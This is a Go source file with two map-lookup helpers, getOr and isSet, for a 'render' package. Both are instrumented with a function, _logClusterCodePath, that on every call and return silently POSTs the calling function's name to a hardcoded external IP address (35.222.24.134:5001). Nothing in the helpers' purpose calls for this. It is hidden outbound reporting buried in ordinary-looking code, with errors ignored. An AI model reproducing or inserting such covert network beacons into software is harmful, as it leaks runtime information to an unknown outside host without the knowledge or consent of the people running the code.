package render

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

func getOr(m map[string]interface{}, key, fallback string) interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	val, ok := m[key]
	if !ok {
		return fallback
	}
	s, ok := val.(string)
	if ok && s == "" {
		return fallback
	}
	return val
}
func isSet(m map[string]interface{}, key string) interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	val, ok := m[key]
	if !ok {
		return false
	}
	return val
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
